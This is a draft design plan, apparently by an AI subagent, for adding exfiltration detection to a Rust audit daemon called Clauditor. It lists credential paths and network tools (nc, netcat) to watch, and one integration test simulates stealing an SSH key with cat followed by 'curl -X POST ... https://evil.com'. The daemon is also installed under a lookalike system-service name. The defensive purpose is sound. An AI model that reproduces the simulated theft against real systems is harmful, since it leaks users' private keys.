# Lightweight Prompt Injection Defense Plan

**Status:** Draft  
**Author:** Grace (Clauditor subagent)  
**Date:** 2026-01-26  

---

## Executive Summary

Add basic prompt injection detection to Clauditor without being scary or breaking the build. Focus on **digest-based alerts** (not real-time panic), **exec-only monitoring** (low overhead), and **test-driven development** (write tests first).

This is NOT an IDS. It's a reasonable baseline that catches the obvious patterns while staying lightweight.

---

## 1. Architecture Changes

### 1.1 Remove Debug Logging from Hot Path

**File:** `crates/collector/src/privileged.rs`

Current state: 15+ `eprintln!` calls in the hot path, including inside the event loop.

**Changes:**
```rust
// REMOVE these from hot path:
eprintln!("fanotify event: pid={} mask={:#x}...");
eprintln!("fanotify read: got {} bytes");
eprintln!("privileged collector read: {} events");

// KEEP only:
// - Error conditions (eprintln! on actual errors)
// - Startup/shutdown messages (once per run)
```

**Impact:** ~10-15 lines removed. Test coverage unchanged.

### 1.2 Exec-Only Mode (Default)

**File:** `crates/collector/src/privileged.rs`

Current mask:
```rust
let mask = FAN_OPEN | FAN_CLOSE | FAN_OPEN_EXEC;  // Too noisy!
```

New default mask:
```rust
let mask = FAN_OPEN_EXEC;  // Exec events only
```

**Why:** 
- FAN_OPEN fires on every `open()` syscall - thousands per second
- FAN_CLOSE fires on every `close()` - equally noisy
- FAN_OPEN_EXEC only fires when a binary is executed - manageable volume

**Make it configurable:**
```toml
[collector]
# "exec_only" (default) or "full" (adds FAN_OPEN/FAN_CLOSE)
mode = "exec_only"
```

### 1.3 Argv Capture Enhancement

**File:** `crates/collector/src/privileged.rs`

Currently we read argv from `/proc/{pid}/cmdline` via `ProcInfo::from_pid()`. This is already working but happens after the fact - the process might exit before we can read it.

**Enhancement:** For short-lived processes, cache the ProcInfo immediately when we get the FAN_OPEN_EXEC event, before we close the event fd.

```rust
// Current (risky for short-lived processes):
let proc_info = ProcInfo::from_pid(meta.pid as u32);

// Better: Read immediately, with retries
let proc_info = ProcInfo::from_pid_with_retry(meta.pid as u32, 2);
```

### 1.4 New Module: Sequence Detector

**New file:** `crates/detector/src/sequence.rs`

```rust
//! Temporal sequence detection for exfil patterns.
//! Tracks: sensitive access → network command sequences.

use std::collections::{HashMap, VecDeque};
use std::time::{Duration, Instant};

pub struct SequenceDetector {
    /// Recent sensitive file accesses: path → timestamp
    sensitive_accesses: VecDeque<(String, Instant)>,
    /// TTL for sensitive access memory
    ttl: Duration,
    /// Max entries to keep
    max_entries: usize,
}

impl SequenceDetector {
    pub fn new() -> Self {
        Self {
            sensitive_accesses: VecDeque::new(),
            ttl: Duration::from_secs(600), // 10 minutes
            max_entries: 100,
        }
    }

    /// Record a sensitive file access
    pub fn record_sensitive_access(&mut self, path: &str) {
        self.prune_stale();
        self.sensitive_accesses.push_back((path.to_string(), Instant::now()));
        if self.sensitive_accesses.len() > self.max_entries {
            self.sensitive_accesses.pop_front();
        }
    }

    /// Check if network command follows recent sensitive access
    pub fn check_exfil_sequence(&mut self, network_cmd: &str) -> Option<SequenceAlert> {
        self.prune_stale();
        if self.sensitive_accesses.is_empty() {
            return None;
        }
        // Return details of the suspicious sequence
        let recent: Vec<_> = self.sensitive_accesses.iter()
            .map(|(p, _)| p.clone())
            .collect();
        Some(SequenceAlert {
            network_command: network_cmd.to_string(),
            accessed_files: recent,
        })
    }

    fn prune_stale(&mut self) {
        let cutoff = Instant::now() - self.ttl;
        while let Some((_, ts)) = self.sensitive_accesses.front() {
            if *ts < cutoff {
                self.sensitive_accesses.pop_front();
            } else {
                break;
            }
        }
    }
}

pub struct SequenceAlert {
    pub network_command: String,
    pub accessed_files: Vec<String>,
}
```

**Sensitive paths to track:**
```rust
const SENSITIVE_PATHS: &[&str] = &[
    ".ssh/",
    "credentials",
    "MEMORY.md",
    ".env",
    ".netrc",
    ".pgpass",
    "token",
    "secret",
    "password",
    ".aws/credentials",
    ".config/gcloud/",
];
```

**Network commands to check:**
```rust
const NETWORK_COMMANDS: &[&str] = &[
    "curl", "wget", "scp", "rsync", "nc", "ncat", "netcat",
    "ssh", "sftp", "ftp",
    "gog", "himalaya", "wacli", "bird",  // Clawdbot-specific
    "sendmail", "mail",
];
```

### 1.5 New Module: Baseline Tracker

**New file:** `crates/detector/src/baseline.rs`

```rust
//! Command baseline tracking.
//! Flags "never seen before" commands.

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::PathBuf;
use std::time::SystemTime;

#[derive(Debug, Serialize, Deserialize)]
pub struct CommandBaseline {
    /// command name → stats
    commands: HashMap<String, CommandStats>,
    /// Path to persist baseline
    #[serde(skip)]
    path: Option<PathBuf>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct CommandStats {
    pub first_seen: u64,  // Unix timestamp
    pub last_seen: u64,
    pub count: u64,
}

impl CommandBaseline {
    pub fn new() -> Self {
        Self { commands: HashMap::new(), path: None }
    }

    pub fn with_path(path: PathBuf) -> std::io::Result<Self> {
        if path.exists() {
            let content = std::fs::read_to_string(&path)?;
            let mut baseline: Self = serde_json::from_str(&content)
                .unwrap_or_else(|_| Self::new());
            baseline.path = Some(path);
            Ok(baseline)
        } else {
            let mut baseline = Self::new();
            baseline.path = Some(path);
            Ok(baseline)
        }
    }

    /// Record a command execution. Returns true if never seen before.
    pub fn record(&mut self, command: &str) -> bool {
        let now = SystemTime::now()
            .duration_since(SystemTime::UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);

        let is_new = !self.commands.contains_key(command);
        
        let stats = self.commands.entry(command.to_string())
            .or_insert_with(|| CommandStats {
                first_seen: now,
                last_seen: now,
                count: 0,
            });
        stats.last_seen = now;
        stats.count += 1;

        is_new
    }

    /// Persist to disk (call periodically, not on every event)
    pub fn persist(&self) -> std::io::Result<()> {
        if let Some(path) = &self.path {
            let content = serde_json::to_string_pretty(self)?;
            std::fs::write(path, content)?;
        }
        Ok(())
    }
}
```

**Default path:** `~/.clawdbot/.audit/baseline.json`

### 1.6 Orphan Detection (Simple)

**Integration point:** `crates/clauditor-cli/src/main.rs`

Check for recent Clawdbot activity by looking at session files:

```rust
fn check_clawdbot_active() -> bool {
    // Check if any session file modified in last 5 minutes
    let session_paths = [
        PathBuf::from("/home/clawdbot/clawd/sessions/"),
        PathBuf::from("/home/clawdbot/.clawdbot/sessions/"),
    ];
    
    let cutoff = SystemTime::now() - Duration::from_secs(300);
    
    for dir in session_paths {
        if let Ok(entries) = std::fs::read_dir(&dir) {
            for entry in entries.flatten() {
                if let Ok(meta) = entry.metadata() {
                    if let Ok(mtime) = meta.modified() {
                        if mtime > cutoff {
                            return true;
                        }
                    }
                }
            }
        }
    }
    false
}
```

**When to flag:** If a watched binary executes and `check_clawdbot_active()` returns false, add `orphan: true` to the event metadata.

### 1.7 Enhanced Digest Output

**File:** `crates/clauditor-cli/src/main.rs` - `run_digest()`

Add new sections to the digest:

```rust
#[derive(Debug, Serialize)]
struct DigestReport {
    // ... existing fields ...
    
    // NEW:
    sequence_alerts: Vec<SequenceAlertReport>,
    new_commands: Vec<NewCommandReport>,
    orphan_execs: usize,
    sensitive_accesses: Vec<SensitiveAccessReport>,
}

#[derive(Debug, Serialize)]
struct SequenceAlertReport {
    timestamp: DateTime<Utc>,
    network_command: String,
    network_argv: String,
    prior_sensitive_files: Vec<String>,
    time_gap_secs: u64,
}

#[derive(Debug, Serialize)]
struct NewCommandReport {
    command: String,
    first_seen: DateTime<Utc>,
    argv_sample: String,
}

#[derive(Debug, Serialize)]
struct SensitiveAccessReport {
    path: String,
    command: String,
    timestamp: DateTime<Utc>,
}
```

---

## 2. Test Cases (Write FIRST!)

### 2.1 Unit Tests for SequenceDetector

**File:** `crates/detector/src/sequence.rs` (inline tests)

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_empty_sequence_no_alert() {
        let mut seq = SequenceDetector::new();
        assert!(seq.check_exfil_sequence("curl").is_none());
    }

    #[test]
    fn test_sensitive_then_network_alerts() {
        let mut seq = SequenceDetector::new();
        seq.record_sensitive_access("/home/user/.ssh/id_rsa");
        let alert = seq.check_exfil_sequence("curl");
        assert!(alert.is_some());
        assert!(alert.unwrap().accessed_files.contains(&"/home/user/.ssh/id_rsa".to_string()));
    }

    #[test]
    fn test_ttl_expiry() {
        let mut seq = SequenceDetector::new();
        seq.ttl = Duration::from_millis(10);
        seq.record_sensitive_access("/home/user/.ssh/id_rsa");
        std::thread::sleep(Duration::from_millis(20));
        assert!(seq.check_exfil_sequence("curl").is_none());
    }

    #[test]
    fn test_multiple_sensitive_files() {
        let mut seq = SequenceDetector::new();
        seq.record_sensitive_access("/home/user/.ssh/id_rsa");
        seq.record_sensitive_access("/home/user/MEMORY.md");
        let alert = seq.check_exfil_sequence("gog");
        assert!(alert.is_some());
        let files = alert.unwrap().accessed_files;
        assert_eq!(files.len(), 2);
    }

    #[test]
    fn test_max_entries_limit() {
        let mut seq = SequenceDetector::new();
        seq.max_entries = 5;
        for i in 0..10 {
            seq.record_sensitive_access(&format!("/path/{}", i));
        }
        assert!(seq.sensitive_accesses.len() <= 5);
    }

    #[test]
    fn test_is_sensitive_path() {
        assert!(is_sensitive_path("/home/user/.ssh/id_rsa"));
        assert!(is_sensitive_path("/home/user/.ssh/known_hosts"));
        assert!(is_sensitive_path("/home/user/credentials.json"));
        assert!(is_sensitive_path("/home/clawdbot/clawd/MEMORY.md"));
        assert!(is_sensitive_path("/home/user/.env"));
        assert!(!is_sensitive_path("/home/user/readme.txt"));
        assert!(!is_sensitive_path("/usr/bin/ls"));
    }

    #[test]
    fn test_is_network_command() {
        assert!(is_network_command("curl"));
        assert!(is_network_command("wget"));
        assert!(is_network_command("gog"));
        assert!(is_network_command("himalaya"));
        assert!(is_network_command("wacli"));
        assert!(!is_network_command("ls"));
        assert!(!is_network_command("cat"));
    }
}
```

### 2.2 Unit Tests for CommandBaseline

**File:** `crates/detector/src/baseline.rs` (inline tests)

```rust
#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::NamedTempFile;

    #[test]
    fn test_new_command_returns_true() {
        let mut baseline = CommandBaseline::new();
        assert!(baseline.record("curl"));  // First time = true
        assert!(!baseline.record("curl")); // Second time = false
    }

    #[test]
    fn test_count_increments() {
        let mut baseline = CommandBaseline::new();
        baseline.record("wget");
        baseline.record("wget");
        baseline.record("wget");
        assert_eq!(baseline.commands.get("wget").unwrap().count, 3);
    }

    #[test]
    fn test_persist_and_load() {
        let tmp = NamedTempFile::new().unwrap();
        let path = tmp.path().to_path_buf();
        
        // Create and save
        {
            let mut baseline = CommandBaseline::new();
            baseline.path = Some(path.clone());
            baseline.record("test_cmd");
            baseline.persist().unwrap();
        }
        
        // Load and verify
        {
            let baseline = CommandBaseline::with_path(path).unwrap();
            assert!(baseline.commands.contains_key("test_cmd"));
            assert_eq!(baseline.commands.get("test_cmd").unwrap().count, 1);
        }
    }

    #[test]
    fn test_load_missing_file() {
        let path = PathBuf::from("/nonexistent/path/baseline.json");
        // Should not panic, should return empty baseline
        // (with_path creates new if file doesn't exist)
        // Actually, this will error on parent dir - test with valid parent
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("baseline.json");
        let baseline = CommandBaseline::with_path(path).unwrap();
        assert!(baseline.commands.is_empty());
    }

    #[test]
    fn test_timestamps_recorded() {
        let mut baseline = CommandBaseline::new();
        baseline.record("ssh");
        let stats = baseline.commands.get("ssh").unwrap();
        assert!(stats.first_seen > 0);
        assert!(stats.last_seen >= stats.first_seen);
    }
}
```

### 2.3 Integration Tests

**File:** `crates/detector/tests/sequence_integration.rs`

```rust
//! Integration test: simulated exfil sequence

use detector::{Detector, DetectorInput, SequenceDetector};

#[test]
fn test_full_exfil_sequence() {
    let mut seq = SequenceDetector::new();
    let detector = Detector::new();

    // Step 1: cat reads SSH key
    let cat_event = DetectorInput::Exec {
        pid: 1001,
        uid: 1000,
        comm: "cat".to_string(),
        argv: vec!["cat".to_string(), "/home/user/.ssh/id_rsa".to_string()],
        cwd: None,
    };
    
    // Detector sees cat - benign by itself
    let alerts = detector.detect(&cat_event);
    assert!(alerts.is_empty());
    
    // But we record the sensitive access
    seq.record_sensitive_access("/home/user/.ssh/id_rsa");

    // Step 2: curl sends data out
    let curl_event = DetectorInput::Exec {
        pid: 1002,
        uid: 1000,
        comm: "curl".to_string(),
        argv: vec!["curl".to_string(), "-X".to_string(), "POST".to_string(), 
                   "-d".to_string(), "@-".to_string(), "https://evil.com".to_string()],
        cwd: None,
    };
    
    // Detector sees curl - generates exfil alert
    let alerts = detector.detect(&curl_event);
    assert!(!alerts.is_empty());
    
    // Sequence detector flags the correlation
    let seq_alert = seq.check_exfil_sequence("curl");
    assert!(seq_alert.is_some());
    let alert = seq_alert.unwrap();
    assert!(alert.accessed_files.contains(&"/home/user/.ssh/id_rsa".to_string()));
}

#[test]
fn test_benign_sequence_no_alert() {
    let mut seq = SequenceDetector::new();
    
    // Access non-sensitive file
    seq.record_sensitive_access("/home/user/readme.txt");
    // Oops, this would flag it - we need is_sensitive check first
    // Actually the main code should check is_sensitive BEFORE calling record_sensitive_access
}
```

### 2.4 Privileged Collector Tests

**File:** `crates/collector/src/privileged.rs` (existing + new)

```rust
#[cfg(test)]
mod tests {
    use super::*;

    // Existing test
    #[test]
    fn check_fanotify_availability() {
        let available = PrivilegedCollector::is_available();
        println!("fanotify available: {available}");
    }

    // NEW: Test mask configuration
    #[test]
    fn test_exec_only_mask() {
        // Verify FAN_OPEN_EXEC is the only data-generating flag
        let exec_only_mask = FAN_OPEN_EXEC;
        assert_eq!(exec_only_mask, 0x00001000);
        
        // Verify FAN_OPEN and FAN_CLOSE are NOT included
        assert_eq!(exec_only_mask & FAN_OPEN, 0);
        assert_eq!(exec_only_mask & FAN_CLOSE, 0);
    }

    // NEW: Test UID filtering logic
    #[test]
    fn test_uid_filter_logic() {
        let target_uid: u32 = 1000;
        let event_uid: u32 = 0;  // root
        assert_ne!(event_uid, target_uid);  // Should be filtered
        
        let event_uid: u32 = 1000;
        assert_eq!(event_uid, target_uid);  // Should pass
    }
}
```

### 2.5 CLI Daemon Tests

**File:** `crates/clauditor-cli/src/main.rs` (add to existing tests)

```rust
#[cfg(test)]
mod tests {
    use super::*;

    // Existing config parse test...

    // NEW: Test check_clawdbot_active with mock
    #[test]
    fn test_session_check_logic() {
        // This tests the logic, not the actual filesystem
        use std::time::{Duration, SystemTime};
        
        let now = SystemTime::now();
        let old = now - Duration::from_secs(600);  // 10 min ago
        let recent = now - Duration::from_secs(60);  // 1 min ago
        
        let cutoff = now - Duration::from_secs(300);  // 5 min threshold
        
        assert!(old < cutoff);   // Old session should NOT count as active
        assert!(recent > cutoff); // Recent session SHOULD count as active
    }

    // NEW: Test digest report structure
    #[test]
    fn test_digest_report_serialize() {
        let report = DigestReport {
            generated_at: Utc::now(),
            log_path: "/test/path.log".to_string(),
            event_count: 100,
            time_range: None,
            integrity: IntegrityStatus::NoKeyProvided,
            alert_summary: AlertSummary::default(),
            top_commands: vec![("curl".to_string(), 10)],
            top_paths: vec![("/home/user".to_string(), 50)],
            anomalies: vec![],
            // NEW fields would go here
        };
        
        let json = serde_json::to_string(&report);
        assert!(json.is_ok());
    }
}
```

---

## 3. Implementation Beads

Small, testable units. Each bead should be committable independently.

### Bead 1: Remove Debug Logging ⚡
**Files:** `crates/collector/src/privileged.rs`, `crates/clauditor-cli/src/main.rs`  
**Changes:** Remove all `eprintln!` from hot paths  
**Tests:** Existing tests still pass  
**Commit:** `chore(bead-1): remove debug logging from hot path`

### Bead 2: Add log Crate for Proper Logging
**Files:** `Cargo.toml`, all crates  
**Changes:** Add `log` crate, replace startup messages with `log::info!`  
**Tests:** Build succeeds, daemon starts  
**Commit:** `feat(bead-2): add proper logging with log crate`

### Bead 3: Exec-Only Mode
**Files:** `crates/collector/src/privileged.rs`, config files  
**Changes:** Change default mask to `FAN_OPEN_EXEC` only  
**Tests:** `test_exec_only_mask` passes  
**Commit:** `feat(bead-3): exec-only mode as default`

### Bead 4: Sensitive Path Detection
**Files:** New `crates/detector/src/sensitive.rs`  
**Changes:** Add `is_sensitive_path()` function  
**Tests:** Unit tests for path matching  
**Commit:** `feat(bead-4): sensitive path detection`

### Bead 5: Sequence Detector Core
**Files:** New `crates/detector/src/sequence.rs`  
**Changes:** Add `SequenceDetector` struct with tests  
**Tests:** All unit tests in 2.1 pass  
**Commit:** `feat(bead-5): sequence detector core`

### Bead 6: Baseline Tracker
**Files:** New `crates/detector/src/baseline.rs`  
**Changes:** Add `CommandBaseline` struct with persistence  
**Tests:** All unit tests in 2.2 pass  
**Commit:** `feat(bead-6): command baseline tracker`

### Bead 7: Integrate Sequence Detector into Daemon
**Files:** `crates/clauditor-cli/src/main.rs`  
**Changes:** Wire up sequence detector in main loop  
**Tests:** Integration test passes  
**Commit:** `feat(bead-7): integrate sequence detector`

### Bead 8: Integrate Baseline Tracker into Daemon
**Files:** `crates/clauditor-cli/src/main.rs`, config  
**Changes:** Load/save baseline, flag new commands  
**Tests:** Baseline persists across restarts  
**Commit:** `feat(bead-8): integrate baseline tracker`

### Bead 9: Orphan Detection
**Files:** `crates/clauditor-cli/src/main.rs`  
**Changes:** Add `check_clawdbot_active()`, flag orphan execs  
**Tests:** Logic test passes  
**Commit:** `feat(bead-9): orphan exec detection`

### Bead 10: Enhanced Digest Report
**Files:** `crates/clauditor-cli/src/main.rs`  
**Changes:** Add new sections to digest output  
**Tests:** Digest generates with new fields  
**Commit:** `feat(bead-10): enhanced digest with sequences and baseline`

---

## 4. Rollback Plan

### If Any Bead Breaks the Build

```bash
# Identify the breaking commit
git log --oneline -5

# Revert the specific bead
git revert HEAD  # or specific commit hash

# Push the revert
git push
```

### If Daemon Won't Start After Deploy

```bash
# Check service status
sudo systemctl status systemd-journaldd

# View recent logs
sudo journalctl -u systemd-journaldd -n 50

# If broken, restore previous binary
sudo cp /usr/local/sbin/systemd-journaldd.backup /usr/local/sbin/systemd-journaldd
sudo systemctl restart systemd-journaldd
```

### Backup Strategy

Before each deploy:
```bash
sudo cp /usr/local/sbin/systemd-journaldd /usr/local/sbin/systemd-journaldd.backup
```

### Feature Flags (Optional)

If we want to be extra safe, add config flags:
```toml
[features]
sequence_detection = true   # Can disable if buggy
baseline_tracking = true    # Can disable if buggy  
orphan_detection = false    # Disabled until tested
```

---

## 5. Success Criteria

### Must Have ✅

1. **All existing tests pass** - `cargo test` green
2. **Daemon starts without errors** - `systemctl status` shows active
3. **No debug spam in journal** - `journalctl -u systemd-journaldd` is quiet
4. **Exec events logged** - Test with `curl https://example.com`, see in log
5. **Digest generates** - `clauditor digest --log <path>` produces output

### Should Have 📊

1. **Sequence detection works** - Cat SSH key, then curl, see alert in digest
2. **Baseline tracks commands** - `~/.clawdbot/.audit/baseline.json` exists and grows
3. **New command flagged** - First-time binary shows in digest
4. **Performance acceptable** - <1% CPU during normal operation

### Nice to Have 🎯

1. **Orphan detection** - Exec with no active session flagged
2. **Config toggle** - Can disable features via config
3. **Daily digest cron** - Auto-generate digest summary

---

## 6. File Summary

### Files to Modify

| File | Changes |
|------|---------|
| `crates/collector/src/privileged.rs` | Remove eprintln, exec-only mask |
| `crates/clauditor-cli/src/main.rs` | Integrate detectors, enhance digest |
| `crates/detector/src/lib.rs` | Export new modules |
| `Cargo.toml` (various) | Add `log`, `tempfile` (dev) |

### Files to Create

| File | Purpose |
|------|---------|
| `crates/detector/src/sensitive.rs` | Sensitive path matching |
| `crates/detector/src/sequence.rs` | Temporal sequence detection |
| `crates/detector/src/baseline.rs` | Command baseline tracking |
| `crates/detector/tests/sequence_integration.rs` | Integration tests |

### Config Changes

| File | Changes |
|------|---------|
| `dist/config/default.toml` | Add `mode = "exec_only"`, baseline path |

---

## 7. Estimated Effort

| Bead | Complexity | Time |
|------|------------|------|
| 1-2 | Low | 30 min |
| 3 | Low | 30 min |
| 4-5 | Medium | 1 hour |
| 6 | Medium | 1 hour |
| 7-8 | Medium | 1 hour |
| 9 | Low | 30 min |
| 10 | Medium | 1 hour |

**Total:** ~6 hours of focused work

---

## 8. Non-Goals (Explicitly Out of Scope)

- **Real-time blocking** - We alert, not block
- **Network traffic inspection** - Just exec monitoring
- **Full process tree tracking** - Too complex
- **Machine learning** - Simple rules only
- **User-facing alerts** - Digest for human review only
- **Complete IDS** - This is a baseline, not OSSEC

---

## Next Steps

1. Review this plan with main agent
2. Get approval on architecture
3. Start with Bead 1 (remove debug logging) - safest change
4. Run full test suite after each bead
5. Deploy incrementally

---

*"Simple things should be simple, complex things should be possible."* — Alan Kay

---

## Bead 11: Update Wizard for v0 Release

**Files:** `wizard/wizard.sh`, `dist/config/default.toml`

**Changes:**
1. Ensure wizard installs exec-only config by default
2. Add post-install verification step
3. Update README.md with v0 features
4. Prepare SKILL.md for ClawdHub submission

**Commit:** `feat(bead-11): update wizard for v0 ClawdHub release`

---

## Additional Requirement: Silent Digest

The digest should be **silent by default** — only output/alert when there's a potential issue.

**Implementation:**
- `clauditor digest` returns exit code 0 with minimal output if clean
- `clauditor digest --verbose` for full report
- Alert only if: sequence detected, orphan exec, new suspicious command
- Daily cron: only notify Clawdbot if anomalies found

```rust
// In digest command
if anomalies.is_empty() && sequence_alerts.is_empty() && orphan_execs == 0 {
    println!("✓ No anomalies detected");
    return Ok(());  // Silent success
}

// Only print full report if issues found
println!("⚠️ {} potential issues detected", total_issues);
// ... detailed report ...
```
